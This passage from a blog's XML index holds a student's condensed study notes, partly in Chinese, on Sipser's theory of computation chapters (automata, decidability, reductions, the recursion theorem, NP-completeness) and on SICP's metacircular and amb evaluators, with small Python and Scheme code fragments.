将每个configuration里的每个symbol都设为一个变量, 按照A accept w的过程来模拟布尔表达式, 构造的表达式只保证符合TM的计算过程(对应的表格是合法的), 只有当accept的时候表达式才有真的赋值 Proof variable: For each $ i $ and $ j $ between 1 and $ n^k $ and for each $ s $ in $ C = Q ∪ Γ ∪ \{ \# \} $, we have a variable, $ x_{i,j,s} $, If $ x_{i,j,s} $ takes on the value 1, it means that $ cell [i, j] $ in the tableau contains an s formula φ: $ φ{cell} ∧ φ{start} ∧ φ{move} ∧ φ{accept} $ $ φ_{cell} ​$: ensure that there must have exactly one variable on for every cell (tableau is valid) $ φ_{start} $: ensure that the first row of the table is the starting configuration $ φ_{accept} $:ensure that an accepting configuration occurs in the tableau $ φ_{move} $: ensure that each row’s configuration legally follows the preceding row’s configuration according to N ’s rules. Ensure each 2 × 3 window of cells is legal complexity of the reduction: $ O(n^{2k} ) $ 7.5 ADDITIONAL NP-COMPLETE PROBLEMS(几乎都是从3SAT reduce 来的….感觉比CLRS难哭唧唧感觉还是CLRS讲的懂一点x) CLIQUE VERTEX-COVER HAMPATH UHAMPATH SUBSET-SUM]]></content>
      <categories>
        <category>Introduction to the Theory of Computation</category>
      </categories>
      <tags>
        <tag>ITOC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ITOC-ch6] ADVANCED TOPICS IN COMPUTABILITY THEORY]]></title>
    <url>%2F2018%2F06%2F08%2FITOC%2F6%2F</url>
    <content type="text"><![CDATA[[ITOC-ch6] ADVANCED TOPICS IN COMPUTABILITY THEORY6.1 THE RECURSION THEOREMMaking machines that reproduce themselves. SELF-REFERENCE Construct $ SELF $ prints out a copy of its own description. LEMMA 6.1 define computable function $ q : Σ^ ∗\longrightarrow Σ ^ ∗ $ w is any string, $ q(w) = &lt; P_w &gt; $ $ P_w $ is a TM that prints out w and then halts. $ SELF $ 2 parts: $ A $ and $ B $, so $ &lt; SELF &gt; = &lt; AB &gt; $ RZ师兄的例子 1 2 3 4 5 6 7 8 9 #python #Part A print &lt;B&gt; a = ['print "a=", a', 'for s in a: print s'] #B compute and print q(&lt;B&gt;) = &lt;A&gt; #这里q函数只是加上了a=而已 print "a=", a #B combine &lt;B&gt; (from the output of that A produce) for s in a: print s Extends the technique so that a program can automatically obtain its own description and then go on to compute with it Recursion theorem First we have a T, than we can construct R Input w to R, R can obtain &lt; R &gt; and give &lt; R &gt; and w to T for further computation $ A $ writes $ w &lt; BT &gt; $ , $ B $ writes $ &lt; A &gt; $ , together the resulting string $ &lt; R, w &gt; $ is on the tape, than passes control to T APPLICATIONS computer virus Simpler proof of $ A_{TM} $ is undecidable (4.11显式构建了D出来) $ MIN_{TM} $ is not Turing-recognizable. For computable function $ t: Σ ^ ∗ → Σ^ ∗ $, there is a $ &lt; F &gt; = t( &lt; F &gt; ) $ 6.2 DECIDABILITY OF LOGICAL THEORIESmodel a tuple $ (U, P_1 , . . . , P_k ) $, where U is the universe ( possible variable values ) and $ P_1 $ through $ P_k $ are the relations assigned to symbols $ R_1 $ through $ R_k $. language of a model use things only the model defined theory of M $ Th(M) $ the collection of true sentences in the language of that model 6.12 $ Th(N , +) $ is decidable. 6.13 $ Th(N , +, ×) $ is undecidable. 6.16 Some true statement in $ Th(N , +, ×) $ is not provable. (真假性客观存在但不可证明) 6.3 TURING REDUCIBILITYReducibility if A is reducible to B, and we find a solution to B, we can obtain a solution to A. Mapping reducibility $ \exists f $ so $ w \in A \Longleftrightarrow f(w) \in B $ Turing reducibility oracle for a language an external device that can report whether a string w is a member of the language oracle Turing Machine TM that has the additional capability of querying an oracle. more powerful than TM Still cannot decide all languages $ E_{TM} $ is decidable relative to $ A_{TM} $ we can use the oracle of $ A_{TM} $ to decide $ E_{TM} $ 6.4 A DEFINITION OF INFORMATIONdefine information using computability theory. quantity of information the size of that object’s smallest representation or description. MINIMAL LENGTH DESCRIPTIONS Select our language describing information describe a binary string x as $ &lt; M &gt; w $ while M is a TM and w is input locate the separation between $ &lt; M &gt; $ and $ w $ One way to do so is to write each bit of $ &lt; M &gt; $ twice, writing 0 as 00 and 1 as 11, and then follow it with 01 to mark the separation point. 6.24: $ \exists c \forall x \ [ K(x) \le |x| + c ] $ 6.25: $ \exists c \forall x \ [ K(xx) \le K(x) + c ] $ 6.26: $ \exists c \forall x,y \ [ K(xy) \le 2K(x) + K(y) + c ] $]]></content>
      <categories>
        <category>Introduction to the Theory of Computation</category>
      </categories>
      <tags>
        <tag>ITOC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ITOC-ch5] REDUCIBILITY]]></title>
    <url>%2F2018%2F05%2F31%2FITOC%2F5%2F</url>
    <content type="text"><![CDATA[[ITOC-ch5] REDUCIBILITYIf A reduces to B we can use a solution to B to solve A solving A is no harder than solving B $ A \longrightarrow B \ (decidable) \Rightarrow A \ (decidable) $ $ A \ (undecidable) \longrightarrow B \Rightarrow B \ (undecidable) $ 5.1 UNDECIDABLE PROBLEMS FROM LANGUAGE THEORYGeneral Idea Contradiction on $ A \longrightarrow B \ (decidable) \Rightarrow A \ (decidable) $ If we have a TM R that decides $ HALT_{TM} $ ( or sth ). Then we can use R to construct a TM S that decides $ A_{TM} $ thus obtain a contradiction. $ A_ {TM} ≤m HALT{TM} $ $ HALT_{TM} = \{ &lt; M, w&gt; \ | \ M \ is \ a \ TM \ and \ M \ halts \ on \ input \ w \}. $ Proof If M loop on w, we can use R to reject. S = “On input $ &lt;M, w&gt; $, an encoding of a TM M and a string w: Run TM R on input $ &lt;M, w&gt; $. If R rejects, reject . If R accepts, simulate M on w until it halts. If M has accepted, accept ; if M has rejected, reject .” $ A_ {TM} ≤m E{TM} $ $ E_{TM} = \{ &lt; M &gt;| \ M \ is \ a \ TM \ and \ L(M) = ∅ \}. $ Proof If $ L (M_1) $ is empty, than M accept w S = “On input $ &lt;M, w&gt; $, an encoding of a TM M and a string w: Construct $ M_1 $ = “On input x: If $ x \neq w $, reject . If $ x = w $, run M on input w and accept if M does.” Run R on input $ &lt; M_1 &gt; $. If R accepts, reject ; if R rejects, accept .” $ A_ {TM} ≤m REGULAR{TM} $ $ REGULAR_{TM} = \{ &lt; M &gt;| \ M \ is \ a \ TM \ and \ L(M) \ is \ a \ regular \ language \}. $ Proof If $ L(M_2) $ is regular, than M accept w If M does not accept w $ M_2 $ recognize $ \{0^n 1^n \ | \ n ≥ 0 \} $ which is nonregular If M accepts w $ M_2 $ recognize all strings $ Σ^ * $ ( including $ 0^n 1^n $) which is regular S = “On input $ &lt;M, w&gt; $, where M is a TM and w is a string: Construct the following TM $ M_2 $ .$ M_2 $ = “On input x: If x has the form $ 0^n 1^n $ , accept . If x does not have this form, run M on input w and accept if M accepts w.” Run R on input $ &lt;M_2 &gt; $. If R accepts, accept; if R rejects, reject .” Rice’s theorem determining any property of the languages recognized by Turing machines is undecidable. $ E_ {TM} ≤m EQ{TM} $ $ EQ_{TM} = \{ &lt; M_1 , M_2 &gt; | \ M_1 \ and \ M_2 \ are \ TMs \ and \ L(M_1) = L(M_2) \}. $ Proof $ M_1 $ is a TM that rejects all inputs. If $ L(M) = L(M_1) $, than $ L(M) = ∅ $ REDUCTIONS VIA COMPUTATION HISTORIES computation history the sequence of configurations that the machine goes through as it processes the input Finite sequences. If M doesn’t halt on w, no accepting or rejecting computation history exists for M on w. Linear bounded automaton the amount of memory is limited and linear in input size n decidable $ A_{LBA} = \{ &lt; M, w&gt;| \ M \ is \ an \ LBA \ that \ accepts \ string \ w \}. $ LEMMA 5.8 If a LBA has q states and g symbols with tape length n. There are exactly $ qng^n $ distinct configurations. Proof reject after $ qng^n $ steps because M is looping $ A_ {TM} ≤m E{LBA} $ $ E_{LBA} = \{ &lt; M &gt;| \ M \ is \ an \ LBA \ where \ L(M) = ∅ \}. $ Proof If $ L(B) \neq ∅ $ = { all accepting computation histories for M on w }, than M accepts w. Construct B to generate all strings that $ C_1 $ is the start configuration for M on w. $ C_l $ is an accepting configuration for M . Each $ C_{i+1} $ legally follows from $ C_i $ . $ A_ {TM} ≤m ALL{LBA} $ $ ALL_{CFG} = \{ &lt; G &gt;| \ G \ is \ a \ CFG \ and \ L(G) = Σ ^ ∗ \}. $ Proof If $ L(G) \neq Σ ^ ∗ $ = { all strings except all computation histories for M on w }, than M accepts w. Construct G to generate all strings that do not start with $ C_1 $ do not end with an accepting configuration some $ C_i $ does not properly yield $ C_{i+1} $ under the rules of M 5.2 A SIMPLE UNDECIDABLE PROBLEMan example of an undecidable problem not concerning automaton Post Correspondence Problem determine that a collection of dominos has a match (repetitions permitted). $ A_ {TM} ≤_m PCP $ $ PCP = \{ &lt; P &gt;| \ P \ is \ an \ instance \ of \ the \ Post \ Correspondence \ Problem \ with \ a \ match\}. $ Proof If the P we construct has a match, than M accepts w Construct P let P be an instance of MPCP that starting matching with the first domino. begins with configuration $ C_1 $ Head motions to right and left Other tape alphabet surrounded the head Separation of the configuration pseudo-steps after accept, head eat adjacent symbols. Final alignment add * symbol so that the only possible match is start with the first domino. ( change MPCP into PCP ) 5.3 MAPPING REDUCIBILITYformalize the notion of mapping reducibility COMPUTABLE FUNCTIONS f == TM FORMAL DEFINITION OF MAPPING REDUCIBILITY mapping reducibility If $ A ≤_m B $ and B is decidable, then A is decidable. Proof construct A’s decider N = “On input w: Compute f (w). Run M on input f (w) and output whatever M outputs.” If $ A ≤_m B $ and A is undecidable, then B is undecidable. $ A \ (undecidable) \longrightarrow B \Rightarrow B \ (undecidable) $ Example of computable function Input $ &lt; M,w &gt; $ while output $ $ $ &lt; M, w &gt; ∈ A_{TM} $ if and only if $ ∈ HALT_{TM} $.]]></content>
      <categories>
        <category>Introduction to the Theory of Computation</category>
      </categories>
      <tags>
        <tag>ITOC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ITOC-ch4] DECIDABILITY]]></title>
    <url>%2F2018%2F05%2F25%2FITOC%2F4%2F</url>
    <content type="text"><![CDATA[[ITOC-ch4] DECIDABILITYRecall: Recognizer if $ w∈L $, than M must accept w. if $ w∉L $, than M may loop when input w. Decider if $ w∈L $, than M must accept w. if $ w∉L $, than M must reject w. 4.1 DECIDABLE LANGUAGESDECIDABLE PROBLEMS CONCERNING REGULAR LANGUAGES $ A_{DFA} = \{ \ &lt;B,w&gt; \ | \ B \ is \ a \ DFA \ that \ accepts \ input \ string \ w \} $. Proof that it’s a decidable language by designing a decider M = “On input &lt;B, w&gt;, where B is a DFA and w is a string: Simulate B on input w. If the simulation ends in an accept state, accept . If it ends in a nonaccepting state, reject .” $ A_{NFA} = \{ \ &lt;B, w&gt; \ | \ B \ is \ an \ NFA \ that \ accepts \ input \ string \ w \} $. Proof Convert NFA to DFA $ A_{REX} = \{ \ &lt;R, w&gt; \ | \ R \ is \ a \ regular \ expression \ that \ generates \ string \ w \}$. Proof Convert RE to NFA $ E_{DFA} = \{ \ &lt; A &gt; | \ A \ is \ a \ DFA \ and \ L(A) = ∅ \} $. Proof Mark all states reachable from start state. accept if no accept state is marked $ EQ_{DFA} = \{ \ &lt;A, B&gt; \ | \ A \ and \ B \ are \ DFA \ s \ and \ L(A) = L(B) \} $. Proof Construct L( C ) = L( A ) xor L( B ), test if L( C ) $ \in E_{DFA} $ DECIDABLE PROBLEMS CONCERNING CONTEXT-FREE LANGUAGES $ A_{CFG} = \{ \ &lt;G, w&gt; \ | \ G \ is \ a \ CFG \ that \ generates \ string \ w \} $ if G were in Chomsky normal form, any derivation of w has 2n − 1 steps, where n is the length of w. Proof List all derivations with 2n − 1 steps, check if w is in them $ E_{CFG} = \{ \ &lt; G &gt; | \ G \ is \ a \ CFG \ and \ L(G) = ∅ \} $. Proof Mark all terminal symbols and Mark all variables that can derive into marked symbols $ EQ_{CFG} = \{ \ &lt;G, H&gt; \ | \ G \ and \ H \ are \ CFG \ s \ and \ L(G) = L(H) \} $. Not decidable (P226) Every context-free language is decidable. Proof: Use TM S that decide $ A_{CFG} $ ( if w is generated by G ) Let G be a CFG for the CFL A we want to decide Run S on &lt;G,w&gt;, if accept, means that $ w \in G $ therefore $ w \in A $, accept 4.2 UNDECIDABILITY$ A_{TM} = \{ \ &lt;M, w&gt; \ | \ M \ is \ a \ TM \ and \ M \ accepts \ w \} $. THE DIAGONALIZATION METHOD same size Set A and set B are the same size if there is a correspondence f : A→B. countable Ex: $ Q = \{ \frac{m}{n} | m, n ∈ N \} $ is countable uncountable Ex: the set of real numbers $ R $ is uncountable using diagonalization method ensure that $ x \neq f (n) $ for any n, therefore the correspondence to $ N $ failed Some languages are not Turing-recognizable. Proof Set of all Turing machines $ M $ is countable (图灵机的个数 == 图灵机识别的语言的个数 == 自然数的个数) each TM M has an encoding into a string \ and set of all strings $ Σ^ ∗ $is countable ( set of finite length strings ) Set of all languages $ L $ is uncountable (所有语言的个数 == 实数的个数) $ B $, the set of all infinite length binary sequence, is uncountable as $ R $ $ L $, the set of all languages over alphabet $ Σ $, have a correspondence with $ B $ Each language $ A ∈ L $ has a unique sequence in $ B $. therefore $ L $ is larger than $ L_{TM}$ AN UNDECIDABLE LANGUAGE $ A_{TM} = \{ \ &lt;M, w&gt; \ | \ M \ is \ a \ TM \ and \ M \ accepts \ w \} $. $ A_{TM} $ is Turing-recognizable Simulate M on w If M ever enters its accept state, accept ; if M ever enters its reject state, reject ; If M loops, loop. $ A_{TM} $ is undecidable Proof Assume we have the decider $ H $ to decide whether M accept w construct a new TM $ D $ with $ H $ as a subroutine Contradiction when we run D with its own description \ as input diagnolization in the proof first list the table of whether $ M_i $ accepts $ &lt;M_j&gt; $ construct $ H $ so that $ H $ reject when $ M_i $ doesn’t accept $ &lt;M_j&gt; $ Finally the contradiction in $ D $ A TURING-UNRECOGNIZABLE LANGUAGE A language is decidable iff it is Turing-recognizable and co-Turing recognizable. Proof if $ A $ decidable, $ \bar A$ is decidable, therefore both are recognizable if both recognizable, we can construct decider for $ A $, therefore $ A $ is decidable Run their recognizer $ M_1 $ and $ M_2 $ simultaneously. If $ M_1 $ accepts, accept ; if $ M_2 $ accepts, reject. $ \overline { A_{TM} } $ is not Turing-recognizable.]]></content>
      <categories>
        <category>Introduction to the Theory of Computation</category>
      </categories>
      <tags>
        <tag>ITOC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ITOC-ch3] THE CHURCH—TURING THESIS]]></title>
    <url>%2F2018%2F05%2F19%2FITOC%2F3%2F</url>
    <content type="text"><![CDATA[[ITOC-ch3] THE CHURCH—TURING THESIS3.1 TURING MACHINESunrestricted access to unlimited memory The Turing machine model uses an infinite tape as its unlimited memory. It has a tape head that can read and write symbols and move both left and right on the tape. The outputs accept and reject are obtained by entering designated accepting and rejecting states. If it doesn’t enter an accepting or a rejecting state, it will go on forever, never halting. DEF configuration a setting of current state, the current tape contents, and the current head location. Machine M Recognizer input a w, accept, reject or loop may fail to accept an input by entering the $ q_{reject} $ state and rejecting, or by looping EX: if $ w \in L $, than M must accept w. if $ w \notin L $, than M may loop when input w. Decider halts on all inputs EX: if $ w \in L $, than M must accept w. if $ w \notin L $, than M must reject w. Language L The collection of strings that M accepts Turing-recognizable language there exist some Turing machine recognizes it. Turing-decidable language there exist some decider decides it. ?Undecidable language exist recognizer accept all strings $ w \in L $ No decider exist, always loop when input specific string $ w \notin L $ example: 4.2 ?H can’t halt when its input D simulate H itself 3.2 VARIANTS OF TURING MACHINESMULTITAPE TURING MACHINES $ δ : Q × Γ^k → Q × Γ^k × { \{L, R, S\} }^k $ equivalent with ordinary Turing machine uses # to separate different tapes uses dot to keep track the heads NONDETERMINISTIC TURING MACHINES $ δ : Q × Γ→P(Q × Γ × \{L, R\}) $ equivalent with ordinary Turing machine have D try all possible branches of N ’s nondeterministic computation tape 1: input; tape2: copy of N ’s tape on some branch; tape 3: node address of N where D is now in ENUMERATORS a Turing machine with an attached printer The language enumerated by E is the collection of all the strings that it eventually prints out. equivalent with ordinary Turing machine construct M recognize language A enumerated by E construct E enumerate language A recognized by M 3.3 THE DEFINITION OF ALGORITHMInformally speaking, an algorithm is a collection of instructions to perform some task. HILBERT’S PROBLEMS Algorithm DEF λ-calculus notation system by Alonzo Church Turing machines by Alan Turing Church–Turing thesis Example: Hilbert’s tenth problem Algorithm: Test whether a polynomial has an integral root TM: constructing such algorithm equals constructing a TM to decide the language D $ D = \{p \ | \ p \ is \ a \ polynomial \ with \ an \ integral \ root\}. $ decider D can’t exist, problem algorithmically unsolvable. TERMINOLOGY FOR DESCRIBING TURING MACHINES 3 levels describing Algorithm or TM formal description spells out in full the Turing machine’s states, transition function, and so on implementation description describe the way TM moves its head and the way it stores data on its tape high-level description input encoded object as strings break the algorithm into stages, each involves individual steps of the Turing machine’s computation]]></content>
      <categories>
        <category>Introduction to the Theory of Computation</category>
      </categories>
      <tags>
        <tag>ITOC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ITOC-ch2] CONTEXT-FREE LANGUAGES]]></title>
    <url>%2F2018%2F05%2F19%2FITOC%2F2%2F</url>
    <content type="text"><![CDATA[[ITOC-ch2] CONTEXT-FREE LANGUAGESIn this chapter we present context-free grammars to describe certain features that have a recursive structure. help us organize and understand relationships of terms. Application: compilers and interpreters Most compilers and interpreters contain a parser that extracts the meaning of a program before generating the compiled code or performing the interpreted execution. 2.1 CONTEXT-FREE GRAMMARContext Free Grammar consists of a collection of substitution rules Variable symbols on the left hand side Terminal other symbols can’t appear in the left hand side in CFG ( Ex: aB –&gt; XX ) Derivation The sequence of substitutions to obtain a string u derives v, written $ u ⇒^{ * } v $, if u = v or if a sequence $u 1 , u 2 , . . . , u k $ exists for k ≥ 0 and $ u ⇒ u 1 ⇒ u 2 ⇒ . . . ⇒ u k ⇒ v. $ Context Free Language strings generated by CFG $ \{ w ∈ Σ^{ ∗ } | S ⇒^{ * } w \}. $ ?Parsing the compiler extracts the ?meaning of the code Parser Tree Representation of the meaning of the code leftmost derivation Derivation that at every step the leftmost remaining variable is the one replaced AMBIGUITY DEF A string w is derived ambiguously in context-free grammar G if it has two or more different leftmost derivations. Grammar G is ambiguous if it generates some string ambiguously. CHOMSKY NORMAL FORM Simplified form for CFG, can generate all CFL. 2.2 PUSHDOWN AUTOMATAnondeterministic PDA (with extra stack ) DEF (transition functions return sets) Computation under PDA A pushdown automaton $ M = (Q, Σ, Γ, δ, q_0 , F ) $ while input $ \in $ $ Σ_ε $, states $ \in Q $, stack strings $ \in Γ^{ ∗ } $ Example EQUIVALENCE WITH CONTEXT-FREE GRAMMARS 2.21 If a language is context free, then some pushdown automaton recognizes it. 2.27 If a pushdown automaton recognizes some language, then it is context free. 2.21 Construct PDA P to accept all strings generated by CFG G Description of P stack push: marker $ than Start variable while ( stack.top != ‘\$’ ) (stack.top == Variable A) nondeterministically select one of the rules A –&gt; w and substitute A by w (stack.top == Terminal a) read next symbol and compare it to a pop ‘\$’, Accept 2.27 construct CFG G that generates all the strings PDA P accepts (go from its Start state to an Accept state) Prepare: simplify P to have following features has single accept state $ q_{accept} $ empties its stack before accepting each transition either push or pop a symbol, but never do both Description of G Variables of G are $ \{A_{pq} \ | \ p, q ∈ Q \ \} $. The start variable is $ A_{q0} ,q_{accept} $. Rules For each $ p ∈ Q $, put the rule $ A_{pp} → ε $ in G. For each $ p, q, r, s ∈ Q $, $ u ∈ Γ $ , and $ a, b ∈ Σε $ , if $ δ(p, a, ε) $ contains $ (r, u) $ and $ δ(s, b, u) $ contains $ (q, ε)$, put the rule $ A{pq} → aA_{rs} b $ in G. For each $ p, q, r ∈ Q $, put the rule $ A_{pq} → A_{pr} A_{rq} $ in G. Idea variable $ A_{pq} $ generates all the strings that can take P from p with an empty stack to q with an empty stack. 递归生成串？最后从最开始的变量 $ A_{q0} ,q_{accept} $ 出发生成的串就是PDA所有ac的串？ Proof prove that this construction works by demonstrating that $ A_{pq} $ generates x if and only if (iff) x can bring P from p with empty stack to q with empty stack. Two direction. Induction 2.3 NON-CONTEXT-FREE LANGUAGESTHE PUMPING LEMMA FOR CONTEXT-FREE LANGUAGES DEF If A is a context-free language, then there is a number p (the pumping length) where, if s is any string in A of length at least p, then s may be divided into five pieces $ s = uvxyz $ satisfying the conditions Proof Let A be a CFL and let G be a CFG that generates it. We assign the pumping length p to be $ b^{|V| + 1 } $ b is maximum number of symbols in the right-hand side of a rule ( maximum number of children per node ) |V| is the number of variables in G $ b^{|V| + 1 } $ is the length of the string when its parse tree is|V| + 1 high τ is a parse tree that has the smallest number of nodes. We show that any strings in A of length at least p may be broken into the five pieces uvxyz, satisfying our three conditions. When τ is at least |V| + 1 high, due to pigeon hole principle, some variable R must appears more than once on that path. And we can divide s as follows Contradiction: if both y and v are ε than τ won’t be the smallest tree generate s The subtree where R generates vxy is at most |V| + 1 high, therefore has length at most $ b^{|V| + 1 } = p $ Example $ C = \{a_i b_j c_k | 0 ≤ i ≤ j ≤ k \ \} $ 2.4 DETERMINISTIC CONTEXT-FREE LANGUAGES]]></content>
      <categories>
        <category>Introduction to the Theory of Computation</category>
      </categories>
      <tags>
        <tag>ITOC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ITOC-ch1] REGULAR LANGUAGES]]></title>
    <url>%2F2018%2F05%2F10%2FITOC%2Fch1%2F</url>
    <content type="text"><![CDATA[[ITOC-ch1] REGULAR LANGUAGES1.1 FINITE AUTOMATADeterministic Finite Automata DEF Every state of a DFA always has exactly one exiting transition arrow for each symbol in the alphabet. Computation under DFA DEF Let M = (Q, Σ, δ, q0 , F ) be a finite automaton and let w = $ w_1 w_2 · · · w_n $ be a string where each $ w_i $ is a member of the alphabet Σ. Then M accepts w if a sequence of states $ r_0 , r_1 , . . . , r_n $ in Q exists with three conditions doing computation == state transition 1.2 NONDETERMINISMNondeterministic Finite Automata DEF Difference a state may have ε, zero, one, or many exiting arrows for each alphabet symbol. Computation under NFA ( $ \in $ ) EQUIVALENCE OF NFAS AND DFAS Every nondeterministic finite automaton has an equivalent deterministic finite automaton. Proof convert the NFA into an equivalent DFA that simulates the NFA We say that M recognizes language A if $ A = \{w| M \ accepts \ w \} $ Regular language DEF DFA == NFA == RL Regular Operations CLOSURE UNDER THE REGULAR OPERATIONS Union Concatenation Star 1.3 REGULAR EXPRESSIONSDEF $ ε $ : empty string; $ ∅ $ : empty set ( even with out empty string ) $ ∅ ^ * = {ε} $ $ 1 ^ ∅ = ∅ $ $ 1 ^ ε = 1 ^ * $ EQUIVALENCE WITH FINITE AUTOMATA FA == RL == RE Proof [1] If a language is described by a regular expression, then it is regular. (Proof by recursive definition from base case 1,2,3 ) [2] If a language is regular, then it is described by a regular expression. Using GNFA the transition arrows may have any regular expressions as labels 1.4 NONREGULAR LANGUAGES( cannot compute infinite possibilities with finite states ) THE PUMPING LEMMA FOR REGULAR LANGUAGES DEF If A is a regular language, then there is a number p (the pumping length) where if s is any string in A of length at least p, then s may be divided into three pieces, $ s = xyz $, satisfying the following conditions: Proof Let M = DFA that recognizes A. We assign the pumping length p to be the number of states of M. We show that any strings in A of length at least p may be broken into the three pieces xyz, satisfying our three conditions. Due to pigeon hole principle, among the first p + 1 elements in the sequence, two must be the same state Therefore we can divide the string as the following figure while q9 is the state appears twice in the first p+1 length Proof language B is not regular Contradiction Assume p exist ( B is regular ) find a string s in B that has length p or greater considering all ways of dividing s into x, y, and z and for each such division, finding a value i where $ xy^i z \notin B $ Example B $= \{ 0^n 1^n | n ≥ 0 \} $ Assume p Choose s to be the string $ 0^p 1^p $. divide s ( 3 cases ) and show $ xy^i z \notin B $]]></content>
      <categories>
        <category>Introduction to the Theory of Computation</category>
      </categories>
      <tags>
        <tag>ITOC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[SICP-ch4] Metalinguistic Abstraction]]></title>
    <url>%2F2018%2F04%2F27%2FSICP%2Fsicp4%2F</url>
    <content type="text"><![CDATA[[SICP-ch4] Metalinguistic Abstractionestablishing new languages and implement these languages by constructing evaluators. (极简版) evaluators ( interpreter ) a procedure that, when applied to an expression of the language, performs the actions required to evaluate that expression. 4.1 The Metacircular Evaluatormetacircular An evaluator that is written in the same language that it evaluates Recall environment model To evaluate a compound procedure, evaluate the subexpressions and then apply thevalue To apply a compound procedure, evaluate the body of the procedure in a new environment. Data Abstraction make the evaluator independent of the representation of the language. 4.1.1 The Core of the Evaluator eval and apply 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 (define (eval exp env) ;primitive (cond ((self-evaluating? exp) exp) ((variable? exp) (lookup-variable-value exp env)) ;special form ((quoted? exp) (text-of-quotation exp)) ((assignment? exp) (eval-assignment exp env)) ((definition? exp) (eval-definition exp env)) ((if? exp) (eval-if exp env)) ((lambda? exp) (make-procedure (lambda-parameters exp) (lambda-body exp) env)) ((begin? exp) (eval-sequence (begin-actions exp) env)) ((cond? exp) (eval (cond-&gt;if exp) env)) ;combinations ((application? exp) ;apply (apply (eval (operator exp) env) (list-of-values (operands exp) env))) (else (error "Unknown expression type: EVAL" exp)))) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 (define (apply procedure arguments) ;primitive (cond ((primitive-procedure? procedure) (apply-primitive-procedure procedure arguments)) ;compound ((compound-procedure? procedure) ;eval (eval-sequence (procedure-body procedure) (extend-environment (procedure-parameters procedure) arguments (procedure-environment procedure)))) (else (error "Unknown procedure type: APPLY" procedure)))) Conditionals eval-if Sequences eval-sequence Assignments eval-assignment Definitions eval-definition 4.1.2 Representing Expressions building constructor, selector and predeicate of our language The only self-evaluating items are numbers and strings Variables are represented by symbols Quotations have the form (quote ⟨text-of-quotation⟩) Assignments have the form (set! ⟨var⟩ ⟨value⟩) Definitions have the form (define ⟨var⟩ ⟨value⟩) lambda expressions are lists that begin with the symbol lambda Conditionals begin with if and have a predicate, a consequent, and an (optional) alternative. begin packages a sequence of expressions into a single expression. An application is any compound expression with operator in car and operands in cdr Derived expressions cond 4.1.3 Evaluator Data Structures representation of true and false procedures environments （a sequence of frams and each frame is a table of bindings） 4.1.4 Running the Evaluator as a Program model the application of primitive procedures. set up a global environment provide a driver loop that models the read-eval-print loop 1 2 3 4 5 6 7 8 9 (define (driver-loop) (prompt-for-input input-prompt) ;input (let ((input (read))) ;evaluate output (let ((output (eval input the-global-environment))) (announce-output output-prompt) (user-print output))) (driver-loop)) 4.1.5 Data as Programs One operational view of the meaning of a program is that a program is a description of an abstract (perhaps infinitely large) machine. Evaluator as a bridge between the data objects and the language From the perspective of the user, (* x x) is an expression in the programming language From the perspective of the evaluator, (* x x) is simply a list to be manipulated. 4.1.6 Internal Definitions evaluator execute definitions in sequence, resulting different scope for internal definition Ways providing simultaneous scope scan all definitions and create, and then set to their values by assignment. 4.1.7 Separating Syntactic Analysis from Execution separate eval into analysis and execution 1 (define (eval exp env) ((analyze exp) env)) syntactic of analysis procedure returns an execution procedure that ignores its environment argument 1 2 (define (analyze-self-evaluating exp) (lambda (env) exp)) analyze-quoted, analyze-variable, analyze-assignment, analyze-definition, analyze-if analyze-lambda, analyze-sequence, analyze-application 4.2 Variations on a Scheme — Lazy Evaluation4.2.1 Normal Order and Applicative Order applicative-order evaluate arguments than apply strict procedure normal-order enter body procedure than evaluate arguments non-strict procedure 4.2.2 An Interpreter with Lazy Evaluation implement a normal-order language thunk delayed arguments contain the information for applying when needed forcing : evaluating expression in thunk Modifying the evaluator primitive: strict compound: non-strict change eval into actual-value 1 2 (define (actual-value exp env) (force-it (eval exp env))) Representing thunks 4.2.3 Streams as Lazy Lists With lazy evaluation, streams and lists can be identical, so there is no need for special forms or for separate list and stream operations. Represent car, cdr and cons as non-strict procedure List lazier than previous stream The car of the list, as well as the cdr , is delayed. won’t need explicit delay anymore ( ch-3 ) 4.3 Variations on a Scheme — Nondeterministic Computingnondeterministic computing support automatic search expressions have more than one possible value Our approach generate the sequence of all possible pairs and filter 4.3.1 Amb and Search amb 1 2 3 4 5 (list (amb 1 2 3) (amb 'a 'b)) can have six possible values: (1 a) (1 b) (2 a) (2 b) (3 a) (3 b) require 1 (define (require p) (if (not p) (amb))) evaluate amb causes time to split into branches machine with sufficient number of processors: parallel executions of choices machine with only one processor: dfs 4.3.2 Examples of Nondeterministic Programs Logical puzzles Parsing natural language 4.3.3 Implementing the amb Evaluator Nondeterministic evaluation result in the discovery of a dead end, must backtrack to a previous choice point Base on 4.1.7: analyzing evalutor ( analyze + execute ) Difference entirely in the execution procedures Execution procedures and continuations the execution procedures in the amb evaluator take three arguments Original: environment Additional: success continuation &amp; failure continuation success continuation Arguments: value &amp; failure continuation recieve value and proceed with the computation call faliure continuation when value leads to a dead end failure continuation try another branch of the nondeterministic process In summary, failure continuations are constructed by amb expressions—to provide a mechanism to make alternative choices if the current choice leads to a dead end; the top-level driver—to provide a mechanism to report failure when the choices are exhausted; assignments—to intercept failures and undo assignments during backtracking. Failures are initiated only when encountered a dead end. This occurs if user program executes (amb) ( no choice any more ) user types try-again at the top-level driver Failure continuations are also called during processing of a failure in order to propagate failure back to the choice point or to the top level: When failure continuation created by an assignment finish undoing, it calls the failure continuation it intercepted, When failure continuation for an amb runs out of choices, it calls the failure continuation that was originally given to the amb Structure of the evaluator amb evaluator 1 2 (define (ambeval exp env succeed fail) ((analyze exp) env succeed fail)) general form of an execution procedure 1 2 3 4 (lambda (env succeed fail) ;; succeed is (lambda (value fail) . . . ) ;; fail is (lambda () . . . ) . . . ) example: amb neo analyze ( return execution procedure ) 1 2 3 4 5 6 7 8 9 10 11 12 13 (define (analyze-amb exp) (let ((cprocs (map analyze (amb-choices exp)))) (lambda (env succeed fail) (define (try-next choices) (if (null? choices) (fail) ((car choices) env ;success continuation succeed ;failure continuation (lambda () (try-next (cdr choices)))))) (try-next cprocs)))) Driver loop either calls try-again in response to the user typing try-again at the driver loop or else starts a new 